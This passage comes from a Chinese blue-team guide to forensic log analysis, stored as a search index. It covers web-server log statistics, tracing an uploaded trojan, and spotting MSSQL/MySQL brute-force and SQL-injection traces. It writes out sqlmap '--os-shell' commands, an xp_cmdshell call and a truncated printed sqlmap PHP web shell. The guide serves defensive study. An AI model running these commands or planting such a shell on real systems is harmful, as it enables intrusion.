log_file | wc -l 4\u3001\u67e5\u770b\u6bcf\u4e00\u4e2aIP\u8bbf\u95ee\u4e86\u591a\u5c11\u4e2a\u9875\u9762\uff1a awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file 5\u3001\u5c06\u6bcf\u4e2aIP\u8bbf\u95ee\u7684\u9875\u9762\u6570\u8fdb\u884c\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff1a awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n 6\u3001\u67e5\u770b\u67d0\u4e00\u4e2aIP\u8bbf\u95ee\u4e86\u54ea\u4e9b\u9875\u9762\uff1a grep ^111.111.111.111 log_file| awk '{print $1,$7}' 7\u3001\u53bb\u6389\u641c\u7d22\u5f15\u64ce\u7edf\u8ba1\u5f53\u5929\u7684\u9875\u9762\uff1a awk '{print $12,$1}' log_file | grep ^\\\"Mozilla | awk '{print $2}' |sort | uniq | wc -l 8\u3001\u67e5\u770b2018\u5e746\u670821\u65e514\u65f6\u8fd9\u4e00\u4e2a\u5c0f\u65f6\u5185\u6709\u591a\u5c11IP\u8bbf\u95ee: awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l 0x03 \u65e5\u5fd7\u5206\u6790\u6848\u4f8b \u00b6 Web\u65e5\u5fd7\u5206\u6790\u5b9e\u4f8b\uff1a\u901a\u8fc7nginx\u4ee3\u7406\u8f6c\u53d1\u5230\u5185\u7f51\u67d0\u670d\u52a1\u5668\uff0c\u5185\u7f51\u670d\u52a1\u5668\u67d0\u7ad9\u70b9\u76ee\u5f55\u4e0b\u88ab\u4e0a\u4f20\u4e86\u591a\u4e2a\u56fe\u7247\u6728\u9a6c\uff0c\u867d\u7136II7\u4e0b\u4e0d\u80fd\u89e3\u6790\uff0c\u4f46\u8fd8\u662f\u60f3\u627e\u51fa\u8c01\u901a\u8fc7\u4ec0\u4e48\u8def\u5f84\u4e0a\u4f20\u7684\u3002 \u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u9047\u5230\u4e86\u4e00\u4e2a\u95ee\u9898\uff1a\u7531\u4e8e\u8bbe\u7f6e\u4e86\u4ee3\u7406\u8f6c\u53d1\uff0c\u53ea\u8bb0\u5f55\u4e86\u4ee3\u7406\u670d\u52a1\u5668\u7684ip\uff0c\u5e76\u6ca1\u6709\u8bb0\u5f55\u8bbf\u95ee\u8005IP\uff1f\u8fd9\u65f6\u5019\uff0c\u5982\u4f55\u53bb\u8bc6\u522b\u4e0d\u540c\u7684\u8bbf\u95ee\u8005\u548c\u653b\u51fb\u6e90\u5462\uff1f \u8fd9\u662f\u7ba1\u7406\u5458\u65e5\u5fd7\u914d\u7f6e\u4e0d\u5f53\u7684\u95ee\u9898\uff0c\u4f46\u597d\u5728\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6d4f\u89c8\u5668\u6307\u7eb9\u6765\u5b9a\u4f4d\u4e0d\u540c\u7684\u8bbf\u95ee\u6765\u6e90\uff0c\u8fd8\u539f\u653b\u51fb\u8def\u5f84\u3002 1\u3001\u5b9a\u4f4d\u653b\u51fb\u6e90 \u9996\u5148\u8bbf\u95ee\u56fe\u7247\u6728\u9a6c\u7684\u8bb0\u5f55\uff0c\u53ea\u627e\u5230\u4e86\u4e00\u6761\uff0c\u7531\u4e8e\u6240\u6709\u8bbf\u95ee\u65e5\u5fd7\u53ea\u8bb0\u5f55\u4e86\u4ee3\u7406IP\uff0c\u5e76\u4e0d\u80fd\u901a\u8fc7IP\u6765\u8fd8\u539f\u653b\u51fb\u8def\u5f84\uff0c\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u6d4f\u89c8\u5668\u6307\u7eb9\u6765\u5b9a\u4f4d\u3002 \u6d4f\u89c8\u5668\u6307\u7eb9\uff1a Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E) 2\u3001\u641c\u7d22\u76f8\u5173\u65e5\u5fd7\u8bb0\u5f55 \u901a\u8fc7\u7b5b\u9009\u4e0e\u8be5\u6d4f\u89c8\u5668\u6307\u7eb9\u6709\u5173\u7684\u65e5\u5fd7\u8bb0\u5f55\uff0c\u53ef\u4ee5\u6e05\u6670\u5730\u770b\u5230\u653b\u51fb\u8005\u7684\u653b\u51fb\u8def\u5f84\u3002 3\u3001\u5bf9\u627e\u5230\u7684\u8bbf\u95ee\u65e5\u5fd7\u8fdb\u884c\u89e3\u8bfb\uff0c\u653b\u51fb\u8005\u5927\u81f4\u7684\u8bbf\u95ee\u8def\u5f84\u5982\u4e0b\uff1a A\u3001\u653b\u51fb\u8005\u8bbf\u95ee\u9996\u9875\u548c\u767b\u5f55\u9875 B\u3001\u653b\u51fb\u8005\u8bbf\u95eeMsgSjlb.aspx\u548cMsgSebd.aspx C\u3001\u653b\u51fb\u8005\u8bbf\u95eeXzuser.aspx D\u3001\u653b\u51fb\u8005\u591a\u6b21POST\uff08\u6000\u7591\u901a\u8fc7\u8fd9\u4e2a\u9875\u9762\u4e0a\u4f20\u6a21\u5757\u7f3a\u9677\uff09 E\u3001\u653b\u51fb\u8005\u8bbf\u95ee\u4e86\u56fe\u7247\u6728\u9a6c \u6253\u5f00\u7f51\u7ad9\uff0c\u8bbf\u95eeXzuser.aspx\uff0c\u786e\u8ba4\u653b\u51fb\u8005\u901a\u8fc7\u8be5\u9875\u9762\u7684\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20\u4e86\u56fe\u7247\u6728\u9a6c\uff0c\u540c\u65f6\uff0c\u53d1\u73b0\u7f51\u7ad9\u4e86\u5b58\u5728\u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u8bbf\u95ee\u7279\u5b9aURL\uff0c\u65e0\u9700\u767b\u5f55\u5373\u53ef\u8fdb\u5165\u540e\u53f0\u754c\u9762\u3002\u901a\u8fc7\u65e5\u5fd7\u5206\u6790\u627e\u5230\u7f51\u7ad9\u7684\u6f0f\u6d1e\u4f4d\u7f6e\u5e76\u8fdb\u884c\u4fee\u590d\u3002 0x04 \u65e5\u5fd7\u7edf\u8ba1\u5206\u6790\u6280\u5de7 \u00b6 \u7edf\u8ba1\u722c\u866b\uff1a grep - E 'Googlebot|Baiduspider' / www / logs / access .2019 - 02 - 23. log | awk '{ print $1 }' | sort | uniq \u7edf\u8ba1\u6d4f\u89c8\u5668\uff1a cat / www / logs / access .2019 - 02 - 23. log | grep - v - E 'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon' | sort | uniq - c | sort - r - n | head - n 100 IP \u7edf\u8ba1\uff1a grep '23/May/2019' / www / logs / access .2019 - 02 - 23. log | awk '{print $1}' | awk - F '.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq - c | sort - r - n | head - n 10 2206 219.136.134.13 1497 182.34.15.248 1431 211.140.143.100 1431 119.145.149.106 1427 61.183.15.179 1427 218.6.8.189 1422 124.232.150.171 1421 106.187.47.224 1420 61.160.220.252 1418 114.80.201.18 \u7edf\u8ba1\u7f51\u6bb5\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $1}' | awk - F '.' '{print $1\".\"$2\".\"$3\".0\"}' | sort | uniq - c | sort - r - n | head - n 200 \u7edf\u8ba1\u57df\u540d\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $2}' | sort | uniq - c | sort - rn | more HTTP Status\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $9}' | sort | uniq - c | sort - rn | more 5056585 304 1125579 200 7602 400 5 301 URL \u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $7}' | sort | uniq - c | sort - rn | more \u6587\u4ef6\u6d41\u91cf\u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}' | sort - rn | more grep ' 200 ' / www / logs / access .2019 - 02 - 23. log | awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}' | sort - rn | more URL\u8bbf\u95ee\u91cf\u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $7}' | egrep '\\?|&' | sort | uniq - c | sort - rn | more \u811a\u672c\u8fd0\u884c\u901f\u5ea6\uff1a \u67e5\u51fa\u8fd0\u884c\u901f\u5ea6\u6700\u6162\u7684\u811a\u672c grep - v 0 $ / www / logs / access .2019 - 02 - 23. log | awk - F '\\\" ' '{print $4\" \" $1}' web . log | awk '{print $1\" \"$8}' | sort - n - k 1 - r | uniq > /tmp/slow_url.txt IP, URL \u62bd\u53d6\uff1a # tail - f / www / logs / access .2019 - 02 - 23. log | grep '/test.html' | awk '{print $1\" \"$7}' \u53c2\u8003\u94fe\u63a5\uff1a https://www.jb51.net/article/53954.htm https://www.jb51.net/article/58017.htm https://cloud.tencent.com/developer/article/1051427 \u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790 \u00b6 \u5e38\u89c1\u7684\u6570\u636e\u5e93\u653b\u51fb\u5305\u62ec\u5f31\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001\u63d0\u5347\u6743\u9650\u3001\u7a83\u53d6\u5907\u4efd\u7b49\u3002\u5bf9\u6570\u636e\u5e93\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u8fd8\u539f\u653b\u51fb\u573a\u666f\u53ca\u8ffd\u6eaf\u653b\u51fb\u6e90\u3002 0x01 MSSQL\u65e5\u5fd7\u5206\u6790 \u00b6 \u9996\u5148\uff0cMSSQL\u6570\u636e\u5e93\u5e94\u542f\u7528\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd\uff0c\u9ed8\u8ba4\u914d\u7f6e\u4ec5\u9650\u5931\u8d25\u7684\u767b\u5f55\uff0c\u9700\u4fee\u6539\u4e3a\u5931\u8d25\u548c\u6210\u529f\u7684\u767b\u5f55\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5bf9\u7528\u6237\u767b\u5f55\u8fdb\u884c\u5ba1\u6838\u3002 \u767b\u5f55\u5230SQL Server Management Studio\uff0c\u4f9d\u6b21\u70b9\u51fb \u7ba1\u7406--SQL Server \u65e5\u5fd7 \u53cc\u51fb\u65e5\u5fd7\u5b58\u6863\u6587\u4ef6\u5373\u53ef\u6253\u5f00\u65e5\u5fd7\u6587\u4ef6\u67e5\u770b\u5668\uff0c\u5e76\u53ef\u4ee5\u5bf9\u65e5\u5fd7\u8fdb\u884c\u7b5b\u9009\u6216\u8005\u5bfc\u51fa\u7b49\u64cd\u4f5c\u3002 \u53e6\u5916\uff0cMSSQ\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5de5\u5177SQL Server Profiler \uff0c\u65b9\u4fbf\u67e5\u627e\u548c\u53d1\u73b0SQL\u6267\u884c\u7684\u6548\u7387\u548c\u8bed\u53e5\u95ee\u9898\u3002 \u65e5\u5fd7\u5206\u6790\u6848\u4f8b\uff1a \u5728\u65e5\u5fd7\u6587\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u9009\u62e9\u7b5b\u9009\uff0c\u5728\u7b5b\u9009\u8bbe\u7f6e\u4e2d\u6e90\u8bbe\u7f6e\u4e3a\u201c\u767b\u5f55\u201d\uff0c\u5e94\u7528\u7b5b\u9009\u5668\uff0c\u786e\u5b9a\u3002 \u7b5b\u9009\u540e\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u8bc6\u522b\u7528\u6237\u767b\u5f55\u4fe1\u606f\uff0c\u8bb0\u5f55\u5185\u5bb9\u5305\u62ec\u7528\u6237\u767b\u5f55\u65f6\u95f4\u3001\u767b\u5f55\u662f\u5426\u6210\u529f\u3001\u767b\u5f55\u4f7f\u7528\u7684\u8d26\u53f7\u4ee5\u53ca\u8fdc\u7a0b\u767b\u5f55\u65f6\u7528\u6237\u4f7f\u7528\u7684IP\u5730\u5740\u3002 \u5982\u4e0b\u56fe\uff1a\u5ba2\u6237\u7aef\uff1a192.168.204.1\u8fdb\u884c\u5c1d\u8bd5\u5f31\u53e3\u4ee4\u767b\u5f55\uff0c\u5e76\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u6761\u767b\u5f55\u6210\u529f\u7684\u8bb0\u5f55\u3002 0x02 SQL\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9 \u00b6 \u5728\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u5c1d\u8bd5\u5229\u7528sqlmap\u7684--os-shell\u53c2\u6570\u53d6\u5f97shell\uff0c\u5982\u64cd\u4f5c\u4e0d\u614e\uff0c\u53ef\u80fd\u7559\u4e0b\u4e00\u4e9bsqlmap\u521b\u5efa\u7684\u4e34\u65f6\u8868\u548c\u81ea\u5b9a\u4e49\u51fd\u6570\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0bsqlmap os-shell\u53c2\u6570\u7684\u7528\u6cd5\u4ee5\u53ca\u539f\u7406\uff1a 1\u3001\u6784\u9020\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u5f00\u542fBurp\u76d1\u542c8080\u7aef\u53e3 sqlmap.py -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP\u901a\u8baf\u8fc7\u7a0b\u5982\u4e0b\uff1a \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u8868sqlmapoutput\uff0c\u8c03\u7528\u5b58\u50a8\u8fc7\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5c06\u6570\u636e\u5199\u5165\u4e34\u65f6\u8868\uff0c\u7136\u540e\u53d6\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e\u5c55\u793a\u5230\u524d\u7aef\u3002 \u901a\u8fc7\u67e5\u770b\u6570\u636e\u5e93\u4e2d\u6700\u8fd1\u65b0\u5efa\u7684\u8868\u7684\u7ed3\u6784\u548c\u5185\u5bb9\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a 1\u3001\u6570\u636e\u5e93\u8868\u68c0\u67e5 2\u3001\u68c0\u67e5xp_cmdshell\u7b49\u5b58\u50a8\u8fc7\u7a0b xp_cmdshell\u5728mssql2005\u4e4b\u540e\u7684\u7248\u672c\u4e2d\u662f\u9ed8\u8ba4\u7981\u6b62\u7684\uff0c\u67e5\u770bxp_cmdshell\u662f\u5426\u88ab\u542f\u7528\u3002 `Exec master.dbo.xp_cmdshell 'whoami' 3\u3001\u9700\u8981\u7ed3\u5408web\u65e5\u5fd7\uff0c\u901a\u8fc7\u67e5\u770b\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\u4ee5\u53ca\u5ba1\u8ba1\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002 \u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790 \u00b6 \u5e38\u89c1\u7684\u6570\u636e\u5e93\u653b\u51fb\u5305\u62ec\u5f31\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001\u63d0\u5347\u6743\u9650\u3001\u7a83\u53d6\u5907\u4efd\u7b49\u3002\u5bf9\u6570\u636e\u5e93\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u8fd8\u539f\u653b\u51fb\u573a\u666f\u53ca\u8ffd\u6eaf\u653b\u51fb\u6e90\u3002 0x01 Mysql\u65e5\u5fd7\u5206\u6790 \u00b6 general query log\u80fd\u8bb0\u5f55\u6210\u529f\u8fde\u63a5\u548c\u6bcf\u6b21\u6267\u884c\u7684\u67e5\u8be2\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u7528\u4f5c\u5b89\u5168\u5e03\u9632\u7684\u4e00\u90e8\u5206\uff0c\u4e3a\u6545\u969c\u5206\u6790\u6216\u9ed1\u5ba2\u4e8b\u4ef6\u540e\u7684\u8c03\u67e5\u63d0\u4f9b\u4f9d\u636e\u3002 1\u3001\u67e5\u770blog\u914d\u7f6e\u4fe1\u606f show variables like '%general%'; 2\u3001\u5f00\u542f\u65e5\u5fd7 SET GLOBAL general_log = 'On'; 3\u3001\u6307\u5b9a\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 #SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log'; \u6bd4\u5982\uff0c\u5f53\u6211\u8bbf\u95ee /test.php?id=1\uff0c\u6b64\u65f6\u6211\u4eec\u5f97\u5230\u8fd9\u6837\u7684\u65e5\u5fd7\uff1a 190604 14:46:14 14 Connect root@localhost on 14 Init DB test 14 Query SELECT * FROM admin WHERE id = 1 14 Quit ` \u6211\u4eec\u6309\u5217\u6765\u89e3\u6790\u4e00\u4e0b\uff1a \u7b2c\u4e00\u5217:Time\uff0c\u65f6\u95f4\u5217\uff0c\u524d\u9762\u4e00\u4e2a\u662f\u65e5\u671f,\u540e\u9762\u4e00\u4e2a\u662f\u5c0f\u65f6\u548c\u5206\u949f\uff0c\u6709\u4e00\u4e9b\u4e0d\u663e\u793a\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e9bsql\u8bed\u53e5\u51e0\u4e4e\u662f\u540c\u65f6\u6267\u884c\u7684,\u6240\u4ee5\u5c31\u4e0d\u53e6\u5916\u8bb0\u5f55\u65f6\u95f4\u4e86\u3002 \u7b2c\u4e8c\u5217:Id\uff0c\u5c31\u662fshow processlist\u51fa\u6765\u7684\u7b2c\u4e00\u5217\u7684\u7ebf\u7a0bID,\u5bf9\u4e8e\u957f\u8fde\u63a5\u548c\u4e00\u4e9b\u6bd4\u8f83\u8017\u65f6\u7684sql\u8bed\u53e5,\u4f60\u53ef\u4ee5\u7cbe\u786e\u627e\u51fa\u7a76\u7adf\u662f\u90a3\u4e00\u6761\u90a3\u4e00\u4e2a\u7ebf\u7a0b\u5728\u8fd0\u884c\u3002 \u7b2c\u4e09\u5217:Command\uff0c\u64cd\u4f5c\u7c7b\u578b\uff0c\u6bd4\u5982Connect\u5c31\u662f\u8fde\u63a5\u6570\u636e\u5e93\uff0cQuery\u5c31\u662f\u67e5\u8be2\u6570\u636e\u5e93(\u589e\u5220\u67e5\u6539\u90fd\u663e\u793a\u4e3a\u67e5\u8be2)\uff0c\u53ef\u4ee5\u7279\u5b9a\u8fc7\u8651\u4e00\u4e9b\u64cd\u4f5c\u3002 \u7b2c\u56db\u5217:Argument\uff0c\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982 Connect root@localhost on \u610f\u601d\u5c31\u662f\u8fde\u63a5\u6570\u636e\u5e93\uff0c\u5982\u6b64\u7c7b\u63a8,\u63a5\u4e0b\u9762\u7684\u8fde\u4e0a\u6570\u636e\u5e93\u4e4b\u540e,\u505a\u4e86\u4ec0\u4e48\u67e5\u8be2\u7684\u64cd\u4f5c\u3002 0x02 \u767b\u5f55\u6210\u529f/\u5931\u8d25 \u00b6 \u6211\u4eec\u6765\u505a\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5\u5427\uff0c\u4f7f\u7528\u6211\u4ee5\u524d\u81ea\u5df1\u5f00\u53d1\u7684\u5f31\u53e3\u4ee4\u5de5\u5177\u6765\u626b\u4e00\u4e0b\uff0c\u5b57\u5178\u8bbe\u7f6e\u6bd4\u8f83\u5c0f\uff0c2\u4e2a\u7528\u6237\uff0c4\u4e2a\u5bc6\u7801\uff0c\u51718\u7ec4\u3002 MySQL\u4e2d\u7684log\u8bb0\u5f55\u662f\u8fd9\u6837\u5b50\uff1a Time Id Command Argument 190601 22:03:20 98 Connect root@192.168.204.1 on 98 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 103 Connect mysql@192.168.204.1 on 103 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 104 Connect mysql@192.168.204.1 on 104 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Connect root@192.168.204.1 on 101 Connect root@192.168.204.1 on 101 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 99 Connect root@192.168.204.1 on 99 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 105 Connect mysql@192.168.204.1 on 105 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Query set autocommit=0 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Quit ` \u4f60\u77e5\u9053\u5728\u8fd9\u4e2a\u53e3\u4ee4\u731c\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u54ea\u4e2a\u662f\u6210\u529f\u7684\u5417\uff1f \u5229\u7528\u7206\u7834\u5de5\u5177\uff0c\u4e00\u4e2a\u53e3\u4ee4\u731c\u89e3\u6210\u529f\u7684\u8bb0\u5f55\u662f\u8fd9\u6837\u5b50\u7684\uff1a 190601 22:03:20 100 Connect root@192.168.204.1 on 100 Query set autocommit=0 100 Quit \u4f46\u662f\uff0c\u5982\u679c\u4f60\u662f\u7528\u5176\u4ed6\u65b9\u5f0f\uff0c\u53ef\u80fd\u4f1a\u6709\u4e00\u70b9\u70b9\u4e0d\u4e00\u6837\u7684\u54e6\u3002 Navicat for MySQL\u767b\u5f55\uff1a 190601 22:14:07 106 Connect root@192.168.204.1 on 106 Query SET NAMES utf8 106 Query SHOW VARIABLES LIKE 'lower_case_%' 106 Query SHOW VARIABLES LIKE 'profiling' 106 Query SHOW DATABASES \u547d\u4ee4\u884c\u767b\u5f55\uff1a 190601 22:17:25 111 Connect root@localhost on 111 Query select @@version_comment limit 1 190601 22:17:56 111 Quit \u8fd9\u4e2a\u5dee\u522b\u5728\u4e8e\uff0c\u4e0d\u540c\u7684\u6570\u636e\u5e93\u8fde\u63a5\u5de5\u5177\uff0c\u5b83\u5728\u8fde\u63a5\u6570\u636e\u5e93\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u4e2d\u662f\u4e0d\u540c\u7684\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u5dee\u522b\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5224\u65ad\u51fa\u7528\u6237\u662f\u901a\u8fc7\u8fde\u63a5\u6570\u636e\u5e93\u7684\u65b9\u5f0f\u3002 \u53e6\u5916\uff0c\u4e0d\u7ba1\u4f60\u662f\u7206\u7834\u5de5\u5177\u3001Navicat for MySQL\u3001\u8fd8\u662f\u547d\u4ee4\u884c\uff0c\u767b\u5f55\u5931\u8d25\u90fd\u662f\u4e00\u6837\u7684\u8bb0\u5f55\u3002 \u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff1a 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) \u5229\u7528shell\u547d\u4ee4\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\uff1a #\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f grep \"Access denied\" mysql.log |cut -d \"'\" -f4|uniq -c|sort -nr 27 192.168.204.1 #\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f grep \"Access denied\" mysql.log |cut -d \"'\" -f2|uniq -c|sort -nr 13 mysql 12 root 1 root 1 mysql \u5728\u65e5\u5fd7\u5206\u6790\u4e2d\uff0c\u7279\u522b\u9700\u8981\u6ce8\u610f\u4e00\u4e9b\u654f\u611f\u7684\u64cd\u4f5c\u884c\u4e3a\uff0c\u6bd4\u5982\u5220\u8868\u3001\u5907\u5e93\uff0c\u8bfb\u5199\u6587\u4ef6\u7b49\u3002\u5173\u952e\u8bcd\uff1adrop table\u3001drop function\u3001lock tables\u3001unlock tables\u3001load_file() \u3001into outfile\u3001into dumpfile\u3002 \u654f\u611f\u6570\u636e\u5e93\u8868\uff1aSELECT from mysql.user\u3001SELECT from mysql.func 0x03 SQL\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9 \u00b6 \u5728\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u5c1d\u8bd5\u5229\u7528sqlmap\u7684--os-shell\u53c2\u6570\u53d6\u5f97shell\uff0c\u5982\u64cd\u4f5c\u4e0d\u614e\uff0c\u53ef\u80fd\u7559\u4e0b\u4e00\u4e9bsqlmap\u521b\u5efa\u7684\u4e34\u65f6\u8868\u548c\u81ea\u5b9a\u4e49\u51fd\u6570\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0bsqlmap os-shell\u53c2\u6570\u7684\u7528\u6cd5\u4ee5\u53ca\u539f\u7406\uff1a 1\u3001\u6784\u9020\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u5f00\u542fBurp\u76d1\u542c8080\u7aef\u53e3 sqlmap.py -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP\u901a\u8baf\u8fc7\u7a0b\u5982\u4e0b\uff1a \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6tmpbwyov.php\uff0c\u901a\u8fc7\u8bbf\u95ee\u8fd9\u4e2a\u6728\u9a6c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5e76\u8fd4\u56de\u5230\u9875\u9762\u5c55\u793a\u3002 tmpbwyov.php\uff1a &1\\n\";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print \" \".$w.\" \";?> ` \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u8868sqlmapoutput\uff0c\u8c03\u7528\u5b58\u50a8\u8fc7\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5c06\u6570\u636e\u5199\u5165\u4e34\u65f6\u8868\uff0c\u7136\u540e\u53d6\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e\u5c55\u793a\u5230\u524d\u7aef\u3002 \u901a\u8fc7\u67e5\u770b\u7f51\u7ad9\u76ee\u5f55\u4e2d\u6700\u8fd1\u65b0\u5efa\u7684\u53ef\u7591\u6587\u4ef6\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a 1\u3001\u68c0\u67e5\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u662f\u5426\u5b58\u5728\u4e00\u4e9b\u6728\u9a6c\u6587\u4ef6\uff1a 2\u3001\u68c0\u67e5\u662f\u5426\u6709UDF\u63d0\u6743\u3001MOF\u63d0\u6743\u75d5\u8ff9 \u68c0\u67e5\u76ee\u5f55\u662f\u5426\u6709\u5f02\u5e38\u6587\u4ef6 mysql\\lib\\plugin c:/windows/system32/wbem/mof/ \u68c0\u67e5\u51fd\u6570\u662f\u5426\u5220\u9664 select * from mysql.func 3\u3001\u7ed3\u5408web\u65e5\u5fd7\u5206\u6790\u3002","title":"\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#1window","text":"","title":"\u7b2c1\u7bc7:Window\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x01-window","text":"Windows\u7cfb\u7edf\u65e5\u5fd7\u662f\u8bb0\u5f55\u7cfb\u7edf\u4e2d\u786c\u4ef6\u3001\u8f6f\u4ef6\u548c\u7cfb\u7edf\u95ee\u9898\u7684\u4fe1\u606f\uff0c\u540c\u65f6\u8fd8\u53ef\u4ee5\u76d1\u89c6\u7cfb\u7edf\u4e2d\u53d1\u751f\u7684\u4e8b\u4ef6\u3002\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5b83\u6765\u68c0\u67e5\u9519\u8bef\u53d1\u751f\u7684\u539f\u56e0\uff0c\u6216\u8005\u5bfb\u627e\u53d7\u5230\u653b\u51fb\u65f6\u653b\u51fb\u8005\u7559\u4e0b\u7684\u75d5\u8ff9\u3002 